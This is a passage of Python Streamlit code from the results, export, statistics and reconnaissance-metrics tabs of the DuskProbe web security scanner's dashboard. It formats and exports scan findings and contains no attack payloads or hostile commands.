                        type_data = {
                            'Type': list(type_counts.keys()),
                            'Count': list(type_counts.values())
                        }
                        st.bar_chart(type_data, x='Type', y='Count', use_container_width=True)
            
            # Filtering and sorting options
            st.markdown("---")
            st.subheader("🔍 Detailed Findings")
            
            filter_col1, filter_col2, filter_col3 = st.columns(3)
            with filter_col1:
                severity_filter = st.multiselect(
                    "Filter by Severity",
                    ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW'],
                    default=['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']
                )
            with filter_col2:
                type_filter = st.multiselect(
                    "Filter by Type",
                    list(set([f.get('type', 'Unknown') for f in all_findings])),
                    default=list(set([f.get('type', 'Unknown') for f in all_findings]))
                )
            with filter_col3:
                sort_by = st.selectbox(
                    "Sort by",
                    ["Severity (High to Low)", "Severity (Low to High)", "Type", "URL"]
                )
            
            # Apply filters
            filtered_findings = [
                f for f in all_findings 
                if f.get('severity') in severity_filter and f.get('type') in type_filter
            ]
            
            # Apply sorting
            if sort_by == "Severity (High to Low)":
                severity_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}
                filtered_findings.sort(key=lambda x: severity_order.get(x.get('severity', 'LOW'), 4))
            elif sort_by == "Severity (Low to High)":
                severity_order = {'LOW': 0, 'MEDIUM': 1, 'HIGH': 2, 'CRITICAL': 3}
                filtered_findings.sort(key=lambda x: severity_order.get(x.get('severity', 'LOW'), 4))
            elif sort_by == "Type":
                filtered_findings.sort(key=lambda x: x.get('type', 'Unknown'))
            elif sort_by == "URL":
                filtered_findings.sort(key=lambda x: x.get('url', ''))
            
            # Display findings
            if filtered_findings:
                st.info(f"Showing **{len(filtered_findings)}** of **{len(all_findings)}** findings")
                
                for idx, finding in enumerate(filtered_findings, 1):
                    severity = finding.get('severity', 'UNKNOWN')
                    vuln_type = finding.get('type', 'Unknown')
                    details = finding.get('details', 'No details')
                    url = finding.get('url', 'N/A')
                    
                    severity_icons = {
                        'CRITICAL': '🔴',
                        'HIGH': '🟠',
                        'MEDIUM': '🟡',
                        'LOW': '🟢'
                    }
                    
                    with st.expander(
                        f"{severity_icons.get(severity, '⚪')} **[{severity}]** {vuln_type} | {url[:60]}...", 
                        expanded=(severity == 'CRITICAL' and idx <= 3)
                    ):
                        detail_col1, detail_col2 = st.columns([2, 1])
                        
                        with detail_col1:
                            st.markdown(f"**🎯 Vulnerability:** {vuln_type}")
                            st.markdown(f"**🔗 URL:** `{url}`")
                            st.markdown(f"**📝 Details:** {details}")
                        
                        with detail_col2:
                            st.markdown(f"**⚠️ Severity:** {severity}")
                            if 'cvss_score' in finding:
                                st.markdown(f"**📊 CVSS:** {finding['cvss_score']}")
                            if 'cwe' in finding:
                                st.markdown(f"**🏷️ CWE:** {finding['cwe']}")
                        
                        if 'recommendation' in finding:
                            st.info(f"💡 **Recommendation:** {finding['recommendation']}")
                        
                        if 'payload' in finding:
                            with st.expander("🧪 View Payload"):
                                st.code(finding['payload'], language='text')
                        
                        if 'response' in finding:
                            with st.expander("📄 View Response"):
                                st.code(finding['response'][:500] + '...' if len(finding['response']) > 500 else finding['response'], language='html')
            else:
                st.success("🎉 No vulnerabilities found matching the selected filters!")
            
            # Export section
            st.markdown("---")
            st.subheader("📥 Export Reports")
            
            export_col1, export_col2, export_col3, export_col4 = st.columns(4)
            
            report_data = {
                'scan_date': results['timestamp'].isoformat(),
                'scan_profile': results['profile'],
                'targets': results['targets'],
                'total_findings': len(all_findings),
                'findings': all_findings,
                'summary': {
                    'critical': critical_count,
                    'high': high_count,
                    'medium': medium_count,
                    'low': low_count,
                    'risk_score': risk_score,
                    'risk_level': risk_level
                },
                'statistics': scan_stats
            }
            
            with export_col1:
                # JSON export
                json_str = json.dumps(report_data, indent=2, default=str)
                st.download_button(
                    label="📄 JSON",
                    data=json_str,
                    file_name=f"duskprobe_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
                    mime="application/json",
                    use_container_width=True
                )
            
            with export_col2:
                # CSV export
                if all_findings:
                    csv_buffer = StringIO()
                    csv_buffer.write("Timestamp,Severity,Type,URL,Details,Recommendation\n")
                    for f in all_findings:
                        csv_buffer.write(f"{results['timestamp']},{f.get('severity','')},{f.get('type','')},{f.get('url','')},{f.get('details','').replace(',',';')},{f.get('recommendation','').replace(',',';')}\n")
                    
                    st.download_button(
                        label="📊 CSV",
                        data=csv_buffer.getvalue(),
                        file_name=f"duskprobe_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv",
                        mime="text/csv",
                        use_container_width=True
                    )
            
            with export_col3:
                # HTML export
                html_report = f"""
                <!DOCTYPE html>
                <html>
                <head>
                    <title>DuskProbe Security Report</title>
                    <style>
                        body {{ font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }}
                        .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; border-radius: 10px; }}
                        .summary {{ background: white; padding: 20px; margin: 20px 0; border-radius: 10px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
                        .finding {{ background: white; padding: 15px; margin: 10px 0; border-radius: 8px; border-left: 4px solid #ccc; }}
                        .critical {{ border-left-color: #e74c3c; }}
                        .high {{ border-left-color: #e67e22; }}
                        .medium {{ border-left-color: #f39c12; }}
                        .low {{ border-left-color: #2ecc71; }}
                        .metric {{ display: inline-block; margin: 10px 20px; }}
                    </style>
                </head>
                <body>
                    <div class="header">
                        <h1>🔍 DuskProbe Security Report</h1>
                        <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
                    </div>
                    <div class="summary">
                        <h2>📊 Executive Summary</h2>
                        <div class="metric"><strong>Total Findings:</strong> {total_count}</div>
                        <div class="metric"><strong>Critical:</strong> {critical_count}</div>
                        <div class="metric"><strong>High:</strong> {high_count}</div>
                        <div class="metric"><strong>Medium:</strong> {medium_count}</div>
                        <div class="metric"><strong>Low:</strong> {low_count}</div>
                        <div class="metric"><strong>Risk Score:</strong> {risk_score}</div>
                        <div class="metric"><strong>Risk Level:</strong> {risk_level}</div>
                    </div>
                    <div class="summary">
                        <h2>🎯 Scan Targets</h2>
                        {''.join([f'<p>• {target}</p>' for target in results['targets']])}
                    </div>
                    <div class="summary">
                        <h2>🔍 Detailed Findings</h2>
                        {''.join([f'''
                        <div class="finding {f.get('severity', 'low').lower()}">
                            <h3>[{f.get('severity', 'UNKNOWN')}] {f.get('type', 'Unknown')}</h3>
                            <p><strong>URL:</strong> {f.get('url', 'N/A')}</p>
                            <p><strong>Details:</strong> {f.get('details', 'No details')}</p>
                            <p><strong>Recommendation:</strong> {f.get('recommendation', 'N/A')}</p>
                        </div>
                        ''' for f in all_findings])}
                    </div>
                    <div class="summary">
                        <p style="text-align: center; color: #666;">
                            <strong>DuskProbe v5.0</strong> | © 2025 Labib Bin Shahed<br>
                            Use responsibly and only on authorized targets
                        </p>
                    </div>
                </body>
                </html>
                """
                
                st.download_button(
                    label="🌐 HTML",
                    data=html_report,
                    file_name=f"duskprobe_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html",
                    mime="text/html",
                    use_container_width=True
                )
            
            with export_col4:
                # Text export
                text_report = f"""
DUSKPROBE SECURITY REPORT
{'='*80}

Scan Date: {results['timestamp'].strftime('%Y-%m-%d %H:%M:%S')}
Profile: {results['profile']}
Targets: {', '.join(results['targets'])}

SUMMARY
{'-'*80}
Total Findings: {total_count}
Critical: {critical_count}
High: {high_count}
Medium: {medium_count}
Low: {low_count}
Risk Score: {risk_score}
Risk Level: {risk_level}

DETAILED FINDINGS
{'-'*80}
{''.join([f'''
[{f.get('severity', 'UNKNOWN')}] {f.get('type', 'Unknown')}
URL: {f.get('url', 'N/A')}
Details: {f.get('details', 'No details')}
Recommendation: {f.get('recommendation', 'N/A')}
{'-'*80}
''' for f in all_findings])}

© 2025 Labib Bin Shahed | DuskProbe v5.0
                """
                
                st.download_button(
                    label="📝 TXT",
                    data=text_report,
                    file_name=f"duskprobe_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
                    mime="text/plain",
                    use_container_width=True
                )
            
            # ========== DATA TABLE VIEW (INTEGRATED) ==========
            st.markdown("---")
            st.subheader("📈 Data Table View - Spreadsheet Analysis")
            
            # Aggregate findings into DataFrame
            all_findings = []
            for result in all_results:
                if result and 'findings' in result:
                    all_findings.extend(result['findings'])
            
            if all_findings:
                # Create comprehensive DataFrame
                df_data = []
                for idx, finding in enumerate(all_findings, 1):
                    # Calculate risk score
                    severity_scores = {'CRITICAL': 10, 'HIGH': 7, 'MEDIUM': 4, 'LOW': 1}
                    risk_score = severity_scores.get(finding.get('severity', 'LOW'), 1)
                    
                    # Extract domain
                    url = finding.get('url', 'N/A')
                    try:
                        domain = urlparse(url).netloc
                    except:
                        domain = 'N/A'
                    
                    df_data.append({
                        'ID': idx,
                        'Timestamp': results['timestamp'].strftime('%Y-%m-%d %H:%M:%S'),
                        'Severity': finding.get('severity', 'UNKNOWN'),
                        'Risk Score': risk_score,
                        'Type': finding.get('type', 'Unknown'),
                        'Category': finding.get('category', 'General'),
                        'URL': url,
                        'Domain': domain,
                        'Method': finding.get('method', 'GET'),
                        'Parameter': finding.get('parameter', 'N/A'),
                        'Payload': finding.get('payload', 'N/A')[:100] + '...' if len(finding.get('payload', '')) > 100 else finding.get('payload', 'N/A'),
                        'Details': finding.get('details', 'No details')[:200] + '...' if len(finding.get('details', '')) > 200 else finding.get('details', 'No details'),
                        'Recommendation': finding.get('recommendation', 'N/A')[:150] + '...' if len(finding.get('recommendation', '')) > 150 else finding.get('recommendation', 'N/A'),
                        'CWE': finding.get('cwe', 'N/A'),
                        'CVSS': finding.get('cvss_score', 'N/A'),
                        'Verified': finding.get('verified', False),
                        'False Positive': finding.get('false_positive', False)
                    })
                
                df = pd.DataFrame(df_data)
                
                # Table controls
                table_col1, table_col2, table_col3, table_col4 = st.columns(4)
                
                with table_col1:
                    show_columns = st.multiselect(
                        "Select Columns",
                        df.columns.tolist(),
                        default=['ID', 'Severity', 'Type', 'URL', 'Details'],
                        help="Choose which columns to display"
                    )
                
                with table_col2:
                    severity_filter_table = st.multiselect(
                        "Filter Severity",
                        ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW'],
                        default=['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']
                    )
                
                with table_col3:
                    sort_column = st.selectbox(
                        "Sort By",
                        ['Risk Score', 'Severity', 'Type', 'Timestamp', 'Domain'],
                        index=0
                    )
                
                with table_col4:
                    sort_order = st.radio(
                        "Order",
                        ['Descending', 'Ascending'],
                        horizontal=True
                    )
                
                # Apply filters
                df_filtered = df[df['Severity'].isin(severity_filter_table)]
                
                # Apply sorting
                ascending = (sort_order == 'Ascending')
                df_filtered = df_filtered.sort_values(by=sort_column, ascending=ascending)
                
                # Display selected columns
                if show_columns:
                    df_display = df_filtered[show_columns]
                else:
                    df_display = df_filtered
                
                # Show metrics
                st.markdown("---")
                metric_c1, metric_c2, metric_c3, metric_c4, metric_c5 = st.columns(5)
                with metric_c1:
                    st.metric("Total Findings", len(df_filtered))
                with metric_c2:
                    st.metric("Unique Domains", df_filtered['Domain'].nunique())
                with metric_c3:
                    st.metric("Avg Risk Score", f"{df_filtered['Risk Score'].mean():.2f}")
                with metric_c4:
                    st.metric("Unique Types", df_filtered['Type'].nunique())
                with metric_c5:
                    st.metric("Verified", df_filtered['Verified'].sum())
                
                # Display interactive dataframe
                st.markdown("---")
                st.markdown("**📊 Interactive Data Table**")
                st.info("💡 Click on column headers to sort. Use filters above to refine the view.")
                
                # Use st.dataframe with configuration for better UX
                st.dataframe(
                    df_display,
                    use_container_width=True,
                    height=600,
                    hide_index=True,
                    column_config={
                        "Risk Score": st.column_config.NumberColumn(
                            "Risk Score",
                            help="Calculated risk score based on severity",
                            format="%d",
                        ),
                        "Severity": st.column_config.TextColumn(
                            "Severity",
                            help="Vulnerability severity level",
                            width="medium",
                        ),
                        "URL": st.column_config.LinkColumn(
                            "URL",
                            help="Target URL",
                            max_chars=50,
                        ),
                        "Verified": st.column_config.CheckboxColumn(
                            "Verified",
                            help="Manually verified",
                            default=False,
                        ),
                        "False Positive": st.column_config.CheckboxColumn(
                            "FP",
                            help="Marked as false positive",
                            default=False,
                        )
                    }
                )
                
                # Export options
                st.markdown("---")
                st.subheader("📥 Export Data Table")
                
                export_col1, export_col2, export_col3, export_col4 = st.columns(4)
                
                with export_col1:
                    # CSV export
                    csv_data = df_filtered.to_csv(index=False)
                    st.download_button(
                        label="📊 Download CSV",
                        data=csv_data,
                        file_name=f"duskprobe_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv",
                        mime="text/csv",
                        use_container_width=True
                    )
                
                with export_col2:
                    # Excel export
                    excel_buffer = BytesIO()
                    with pd.ExcelWriter(excel_buffer, engine='openpyxl') as writer:
                        df_filtered.to_excel(writer, sheet_name='Findings', index=False)
                        
                        # Add summary sheet
                        summary_data = {
                            'Metric': ['Total Findings', 'Critical', 'High', 'Medium', 'Low', 'Unique Domains', 'Unique Types'],
                            'Value': [
                                len(df_filtered),
                                len(df_filtered[df_filtered['Severity'] == 'CRITICAL']),
                                len(df_filtered[df_filtered['Severity'] == 'HIGH']),
                                len(df_filtered[df_filtered['Severity'] == 'MEDIUM']),
                                len(df_filtered[df_filtered['Severity'] == 'LOW']),
                                df_filtered['Domain'].nunique(),
                                df_filtered['Type'].nunique()
                            ]
                        }
                        pd.DataFrame(summary_data).to_excel(writer, sheet_name='Summary', index=False)
                    
                    excel_buffer.seek(0)
                    st.download_button(
                        label="📈 Download Excel",
                        data=excel_buffer,
                        file_name=f"duskprobe_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.xlsx",
                        mime="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
                        use_container_width=True
                    )
                
                with export_col3:
                    # JSON export
                    json_data = df_filtered.to_json(orient='records', indent=2)
                    st.download_button(
                        label="📄 Download JSON",
                        data=json_data,
                        file_name=f"duskprobe_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
                        mime="application/json",
                        use_container_width=True
                    )
                
                with export_col4:
                    # Markdown export
                    markdown_table = df_filtered.to_markdown(index=False)
                    st.download_button(
                        label="📝 Download Markdown",
                        data=markdown_table,
                        file_name=f"duskprobe_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md",
                        mime="text/markdown",
                        use_container_width=True
                    )
                
                # Advanced data analysis
                st.markdown("---")
                st.subheader("🔬 Quick Data Analysis")
                
                analysis_col1, analysis_col2 = st.columns(2)
                
                with analysis_col1:
                    st.markdown("**Top 10 Most Common Vulnerabilities**")
                    type_counts = df_filtered['Type'].value_counts().head(10)
                    st.bar_chart(type_counts)
                
                with analysis_col2:
                    st.markdown("**Top 10 Most Affected Domains**")
                    domain_counts = df_filtered['Domain'].value_counts().head(10)
                    st.bar_chart(domain_counts)
            
            else:
                st.info("📭 No findings to display in table view.")
        
        else:
            st.info("📭 No scan results available. Run a scan from the Scanner tab to view results here.")
    
    # ========== TAB 3: STATISTICS DASHBOARD ==========
    with tab3:
        st.subheader("📉 Statistics Dashboard")
        
        if st.session_state.current_results:
            results = st.session_state.current_results
            all_results = results['results']
            
            # Aggregate findings
            all_findings = []
            for result in all_results:
                if result and 'findings' in result:
                    all_findings.extend(result['findings'])
            
            if all_findings:
                # Create DataFrame for analysis
                df_findings = pd.DataFrame(all_findings)
                
                # Calculate comprehensive statistics
                st.markdown("### 📊 Executive Overview")
                
                stat_col1, stat_col2, stat_col3, stat_col4, stat_col5, stat_col6 = st.columns(6)
                
                critical_count = len([f for f in all_findings if f.get('severity') == 'CRITICAL'])
                high_count = len([f for f in all_findings if f.get('severity') == 'HIGH'])
                medium_count = len([f for f in all_findings if f.get('severity') == 'MEDIUM'])
                low_count = len([f for f in all_findings if f.get('severity') == 'LOW'])
                
                # Calculate advanced metrics
                total_findings = len(all_findings)
                risk_score = (critical_count * 10) + (high_count * 7) + (medium_count * 4) + (low_count * 1)
                unique_types = len(set([f.get('type', 'Unknown') for f in all_findings]))
                
                with stat_col1:
                    st.metric("Total Findings", total_findings)
                with stat_col2:
                    st.metric("Risk Score", risk_score)
                with stat_col3:
                    st.metric("Unique Types", unique_types)
                with stat_col4:
                    st.metric("Critical", critical_count, delta=f"{(critical_count/total_findings*100):.1f}%" if total_findings > 0 else "0%")
                with stat_col5:
                    st.metric("High", high_count, delta=f"{(high_count/total_findings*100):.1f}%" if total_findings > 0 else "0%")
                with stat_col6:
                    avg_per_url = total_findings / len(results['targets']) if results['targets'] else 0
                    st.metric("Avg/URL", f"{avg_per_url:.1f}")
                
                # Visualizations
                st.markdown("---")
                st.markdown("### 📈 Visual Analytics")
                
                viz_col1, viz_col2, viz_col3 = st.columns(3)
                
                with viz_col1:
                    st.markdown("**Severity Distribution (Pie)**")
                    severity_data = pd.DataFrame({
                        'Severity': ['Critical', 'High', 'Medium', 'Low'],
                        'Count': [critical_count, high_count, medium_count, low_count]
                    })
                    # Create pie chart data for visualization
                    if severity_data['Count'].sum() > 0:
                        st.write("🔴 Critical:", critical_count)
                        st.write("🟠 High:", high_count)
                        st.write("🟡 Medium:", medium_count)
                        st.write("🟢 Low:", low_count)
                        st.progress(critical_count / total_findings if total_findings > 0 else 0, "Critical")
                        st.progress(high_count / total_findings if total_findings > 0 else 0, "High")
                        st.progress(medium_count / total_findings if total_findings > 0 else 0, "Medium")
                        st.progress(low_count / total_findings if total_findings > 0 else 0, "Low")
                
                with viz_col2:
                    st.markdown("**Top 5 Vulnerability Types**")
                    type_counts = Counter([f.get('type', 'Unknown') for f in all_findings])
                    top_5_types = dict(type_counts.most_common(5))
                    for vtype, count in top_5_types.items():
                        st.write(f"**{vtype}:** {count}")
                        st.progress(count / total_findings if total_findings > 0 else 0)
                
                with viz_col3:
                    st.markdown("**Scan Performance**")
                    scan_stats = results.get('stats', {})
                    st.metric("Total Requests", scan_stats.get('total_requests', 0))
                    st.metric("Scanned URLs", scan_stats.get('scanned_urls', 0))
                    if 'start_time' in scan_stats:
                        duration = (datetime.now() - scan_stats['start_time']).seconds
                        st.metric("Duration (seconds)", duration)
                        if duration > 0 and scan_stats.get('total_requests', 0) > 0:
                            req_per_sec = scan_stats['total_requests'] / duration
                            st.metric("Req/Second", f"{req_per_sec:.2f}")
                
                # Advanced visualizations
                st.markdown("---")
                st.markdown("### 📊 Detailed Breakdown")
                
                detail_col1, detail_col2 = st.columns(2)
                
                with detail_col1:
                    st.markdown("**Vulnerability Type Distribution**")
                    type_df = pd.DataFrame(list(type_counts.items()), columns=['Type', 'Count'])
                    type_df = type_df.sort_values('Count', ascending=False).head(10)
                    st.bar_chart(type_df.set_index('Type'))
                    
                    st.markdown("---")
                    st.markdown("**Severity by Type Heatmap Data**")
                    heatmap_data = defaultdict(lambda: {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0})
                    for f in all_findings:
                        vtype = f.get('type', 'Unknown')
                        severity = f.get('severity', 'LOW')
                        heatmap_data[vtype][severity] += 1
                    
                    # Display as table
                    heatmap_df = pd.DataFrame(heatmap_data).T
                    st.dataframe(heatmap_df, use_container_width=True)
                
                with detail_col2:
                    st.markdown("**Findings Timeline**")
                    # Create timeline data
                    timeline_data = []
                    for idx, f in enumerate(all_findings):
                        timeline_data.append({
                            'Index': idx + 1,
                            'Type': f.get('type', 'Unknown'),
                            'Severity': f.get('severity', 'LOW')
                        })
                    timeline_df = pd.DataFrame(timeline_data)
                    st.line_chart(timeline_df.groupby('Index').size())
                    
                    st.markdown("---")
                    st.markdown("**Risk Distribution Over Scan**")
                    # Calculate cumulative risk
                    cumulative_risk = []
                    current_risk = 0
                    severity_scores = {'CRITICAL': 10, 'HIGH': 7, 'MEDIUM': 4, 'LOW': 1}
                    for f in all_findings:
                        current_risk += severity_scores.get(f.get('severity', 'LOW'), 1)
                        cumulative_risk.append(current_risk)
                    
                    risk_df = pd.DataFrame({
                        'Finding': range(1, len(cumulative_risk) + 1),
                        'Cumulative Risk': cumulative_risk
                    })
                    st.line_chart(risk_df.set_index('Finding'))
                
                # Domain analysis
                st.markdown("---")
                st.markdown("### 🌐 Domain & URL Analysis")
                
                domain_col1, domain_col2, domain_col3 = st.columns(3)
                
                # Extract domains
                domains = []
                for f in all_findings:
                    url = f.get('url', '')
                    try:
                        domain = urlparse(url).netloc
                        if domain:
                            domains.append(domain)
                    except:
                        pass
                
                domain_counts = Counter(domains)
                
                with domain_col1:
                    st.markdown("**Most Vulnerable Domains**")
                    for domain, count in domain_counts.most_common(5):
                        st.write(f"**{domain}:** {count} findings")
                
                with domain_col2:
                    st.markdown("**URL Statistics**")
                    unique_urls = len(set([f.get('url', '') for f in all_findings]))
                    st.metric("Unique URLs", unique_urls)
                    st.metric("Unique Domains", len(domain_counts))
                    st.metric("Avg Findings/Domain", f"{sum(domain_counts.values()) / len(domain_counts):.2f}" if domain_counts else "0")
                
                with domain_col3:
                    st.markdown("**Protocol Distribution**")
                    protocols = []
                    for f in all_findings:
                        url = f.get('url', '')
                        try:
                            protocol = urlparse(url).scheme
                            if protocol:
                                protocols.append(protocol.upper())
                        except:
                            pass
                    
                    protocol_counts = Counter(protocols)
                    for protocol, count in protocol_counts.items():
                        st.write(f"**{protocol}:** {count}")
                
                # Comparison with history
                if len(st.session_state.scan_history) > 1:
                    st.markdown("---")
                    st.markdown("### 📊 Historical Comparison")
                    
                    # Get last 5 scans
                    history_data = []
                    for scan in st.session_state.scan_history[-5:]:
                        scan_findings = []
                        for result in scan['results']:
                            if result and 'findings' in result:
                                scan_findings.extend(result['findings'])
                        
                        history_data.append({
                            'Timestamp': scan['timestamp'].strftime('%m/%d %H:%M'),
                            'Total': len(scan_findings),
                            'Critical': len([f for f in scan_findings if f.get('severity') == 'CRITICAL']),
                            'High': len([f for f in scan_findings if f.get('severity') == 'HIGH']),
                            'Medium': len([f for f in scan_findings if f.get('severity') == 'MEDIUM']),
                            'Low': len([f for f in scan_findings if f.get('severity') == 'LOW'])
                        })
                    
                    history_df = pd.DataFrame(history_data)
                    
                    hist_viz_col1, hist_viz_col2 = st.columns(2)
                    
                    with hist_viz_col1:
                        st.markdown("**Findings Trend**")
                        st.line_chart(history_df.set_index('Timestamp')[['Total', 'Critical', 'High']])
                    
                    with hist_viz_col2:
                        st.markdown("**Severity Trend**")
                        st.area_chart(history_df.set_index('Timestamp')[['Critical', 'High', 'Medium', 'Low']])
                
            else:
                st.info("📭 No findings to analyze.")
        
        else:
            st.info("📭 No scan results available. Run a scan from the Scanner tab to view statistics.")
    
    # ========== TAB 4: RECONNAISSANCE ==========
    with tab4:
        
        
        if st.session_state.current_results and st.session_state.current_results.get('results'):
            first_result = st.session_state.current_results['results'][0]
            site_info = first_result.get('site_info', {})
            advanced_recon = site_info.get('advanced_recon', {})
            
            if advanced_recon:
                advanced_analysis = advanced_recon.get('advanced_analysis', {})
                dns_records = advanced_recon.get('dns_records', {})
                ip_intel = advanced_recon.get('ip_intelligence', {})
                ssl_cert = advanced_recon.get('ssl_certificate', {})
                technologies = advanced_recon.get('technologies', {})
                subdomains = advanced_recon.get('subdomains', [])
                whois_data = advanced_recon.get('whois', {})
                
                # === 30-METRIC DASHBOARD - 5 COLUMNS ===
                st.markdown("### Live Reconnaissance Metrics")
                
                # Row 1: Metrics 1-5
                col1, col2, col3, col4, col5 = st.columns(5)
                with col1:
                    ipv4 = dns_records.get('A', ['N/A'])[0] if dns_records.get('A') else 'N/A'
                    st.metric("[1] IPv4 Address", ipv4[:15])
                with col2:
                    ipv6 = dns_records.get('AAAA', ['None'])[0] if dns_records.get('AAAA') else 'None'
                    st.metric("[2] IPv6 Address", ipv6[:15] if ipv6 != 'None' else 'None')
                with col3:
                    country = ip_intel.get('asn_country', 'Unknown') if isinstance(ip_intel, dict) else 'Unknown'
                    st.metric("[3] Country", country)
                with col4:
                    isp = ip_intel.get('isp', 'Unknown') if isinstance(ip_intel, dict) else 'Unknown'
                    st.metric("[4] ISP/Hosting", isp[:20] if len(isp) > 20 else isp)
                with col5:
                    asn = ip_intel.get('asn', 'Unknown') if isinstance(ip_intel, dict) else 'Unknown'
                    st.metric("[5] ASN", asn)
                
                # Row 2: Metrics 6-10
                col1, col2, col3, col4, col5 = st.columns(5)
                with col1:
                    os_fp = advanced_analysis.get('os_fingerprint', {})
                    os_guess = os_fp.get('guess', 'Unknown')[:15]
                    st.metric("[6] OS Fingerprint", os_guess)
                with col2:
                    lb = advanced_analysis.get('load_balancer', {})
                    lb_status = "Yes" if lb.get('detected') else "No"
                    st.metric("[7] Load Balancer", lb_status)
                with col3:
                    web_servers = technologies.get('web_servers', []) if isinstance(technologies, dict) else []
                    server = web_servers[0][:20] if web_servers else 'Unknown'
                    st.metric("[8] Web Server", server)
                with col4:
                    langs = technologies.get('programming_languages', []) if isinstance(technologies, dict) else []
                    lang = langs[0][:15] if langs else 'Unknown'
                    st.metric("[9] Language", lang)
                with col5:
                    frameworks = technologies.get('web_frameworks', []) if isinstance(technologies, dict) else []
                    framework = frameworks[0][:18] if frameworks else 'None'
                    st.metric("[10] Framework", framework)
                
                # Row 3: Metrics 11-15
                col1, col2, col3, col4, col5 = st.columns(5)
                with col1:
                    cms = technologies.get('cms', []) if isinstance(technologies, dict) else []
                    cms_name = cms[0][:18] if cms else 'None'
                    st.metric("[11] CMS", cms_name)
                with col2:
                    waf = advanced_analysis.get('waf_detection', {})
                    waf_name = waf.get('waf_name', 'None')[:15]
                    st.metric("[12] WAF", waf_name)
                with col3:
                    analytics = advanced_analysis.get('analytics_ids', {})
                    analytics_count = len(analytics) if isinstance(analytics, dict) and 'status' not in analytics else 0
                    st.metric("[13] Analytics IDs", analytics_count)
                with col4:
                    issuer = 'N/A'
                    if isinstance(ssl_cert, dict) and not ssl_cert.get('error'):
                        # Try issuer_cn first (clean name)
                        if ssl_cert.get('issuer_cn'):
                            issuer = ssl_cert['issuer_cn'][:20]
                        elif ssl_cert.get('issuer'):
                            issuer_full = str(ssl_cert['issuer'])
                            # Try to extract CN
                            if 'CN=' in issuer_full:
                                try:
                                    issuer = issuer_full.split('CN=')[1].split(',')[0][:20]
                                except:
                                    issuer = issuer_full[:20]
                            else:
                                issuer = issuer_full[:20]
                    st.metric("[14] Cert Issuer", issuer)
                with col5:
                    days_left = 'N/A'
                    if isinstance(ssl_cert, dict) and not ssl_cert.get('error'):
                        days_val = ssl_cert.get('days_until_expiry')
                        if isinstance(days_val, (int, float)):
                            days_left = f"{int(days_val)}d"
                    st.metric("[15] Cert Expiry", days_left)
                
                # Row 4: Metrics 16-20
                col1, col2, col3, col4, col5 = st.columns(5)
                with col1:
                    san_count = 0
                    if isinstance(ssl_cert, dict) and 'san' in ssl_cert:
                        san_count = len(ssl_cert['san'])
                    st.metric("[16] SAN Entries", san_count)
                with col2:
                    jarm = advanced_analysis.get('jarm_fingerprint', '')
                    st.metric("[17] JARM", "N/A")
                with col3:
                    mx_count = len(dns_records.get('MX', [])) if isinstance(dns_records, dict) else 0
                    st.metric("[18] MX Records", mx_count)
                with col4:
                    spf = advanced_analysis.get('spf_dmarc', {}).get('spf', 'Not configured')
                    spf_status = "Yes" if spf != 'Not configured' else "No"
                    st.metric("[19] SPF", spf_status)
                with col5:
                    dmarc = advanced_analysis.get('spf_dmarc', {}).get('dmarc', 'Not configured')
                    dmarc_status = "Yes" if dmarc != 'Not configured' else "No"
                    st.metric("[20] DMARC", dmarc_status)
                
                # Row 5: Metrics 21-25
                col1, col2, col3, col4, col5 = st.columns(5)
                with col1:
                    saas = advanced_analysis.get('saas_verification', {})
                    saas_count = len(saas) if isinstance(saas, dict) and 'status' not in saas else 0
                    st.metric("[21] SaaS Tokens", saas_count)
                with col2:
                    cname_count = len(dns_records.get('CNAME', [])) if isinstance(dns_records, dict) else 0
                    st.metric("[22] CNAME", cname_count)
                with col3:
                    ports = advanced_analysis.get('open_ports', [])
                    port_count = len([p for p in ports if isinstance(p, int)]) if isinstance(ports, list) else 0
                    st.metric("[23] Open Ports", port_count)
                with col4:
                    headers = advanced_analysis.get('security_headers', {})
                    missing = sum(1 for v in headers.values() if v == 'Missing')
                    st.metric("[24] Missing Hdrs", f"{missing}/7")
                with col5:
                    cookies = advanced_analysis.get('cookie_security', {})
                    cookie_score = 0
                    if cookies.get('httponly'): cookie_score += 1
                    if cookies.get('secure'): cookie_score += 1
                    if cookies.get('samesite'): cookie_score += 1
                    st.metric("[25] Cookie Flags", f"{cookie_score}/3" if 'status' not in cookies else "0/3")
                
                # Row 6: Metrics 26-30
                col1, col2, col3, col4, col5 = st.columns(5)
                with col1:
                    cors = advanced_analysis.get('cors_config', {})
                    cors_origin = cors.get('access_control_allow_origin', 'Not Set')
                    cors_risk = "Risky" if cors_origin == '*' else "Safe"
                    st.metric("[26] CORS", cors_risk)
                with col2:
                    methods = advanced_analysis.get('http_methods', [])
                    method_count = len([m for m in methods if isinstance(m, str) and m.isupper()]) if isinstance(methods, list) else 0
                    st.metric("[27] HTTP Methods", method_count)
                with col3:
                    robots = advanced_analysis.get('robots_sitemap', {})
                    sec_txt = robots.get('security_txt', 'Not found')
                    st.metric("[28] Security.txt", "Yes" if sec_txt == 'Found' else "No")
                with col4:
                    robots_status = robots.get('robots_txt', 'Not found')
                    st.metric("[29] Robots.txt", "Yes" if robots_status == 'Found' else "No")
                with col5:
                    sensitive = advanced_analysis.get('sensitive_files', {})
                    exposed_count = len(sensitive) if isinstance(sensitive, dict) and 'status' not in sensitive else 0
                    st.metric("[30] Exposed Files", exposed_count, delta="CRITICAL" if exposed_count > 0 else None)
                
                # === MODERN LIBRARY METRICS ===
                st.markdown("### Modern Reconnaissance Metrics (HTTP/2, TLS, CDN, Cloud)")
                
